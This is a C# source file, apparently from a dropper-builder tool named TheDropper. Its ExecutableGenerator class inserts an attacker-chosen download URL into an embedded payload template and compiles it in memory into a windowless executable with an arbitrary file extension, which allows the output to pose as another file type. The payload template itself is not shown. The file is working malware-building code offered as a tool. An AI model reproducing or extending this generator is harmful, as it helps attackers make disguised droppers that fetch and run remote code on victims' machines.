using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Windows.Forms;
using Microsoft.CSharp;
using TheDropper.Properties;

namespace TheDropper.Generators;

internal class ExecutableGenerator
{
	public static string fileUrl { get; private set; }

	public static string fileName { get; private set; }

	public ExecutableGenerator(string url)
	{
		Uri uri = new Uri(url);
		fileUrl = uri.AbsoluteUri;
		fileName = Path.GetFileName(uri.LocalPath);
	}

	public string Generate(string outExtension)
	{
		string text = Resources.exe_payload.Replace("{PAYLOAD_NAME}", fileName).Replace("{PAYLOAD_URL}", fileUrl);
		using CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider();
		CompilerParameters compilerParameters = new CompilerParameters
		{
			GenerateInMemory = true,
			GenerateExecutable = true,
			CompilerOptions = "/t:winexe",
			OutputAssembly = Path.Combine(Directory.GetCurrentDirectory(), "output." + outExtension)
		};
		compilerParameters.ReferencedAssemblies.Add("System.dll");
		CompilerResults compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, text);
		if (compilerResults.Errors.HasErrors)
		{
			foreach (CompilerError error in compilerResults.Errors)
			{
				MessageBox.Show(error.ErrorText, "#" + error.ErrorNumber);
			}
		}
		return compilerParameters.OutputAssembly;
	}
}
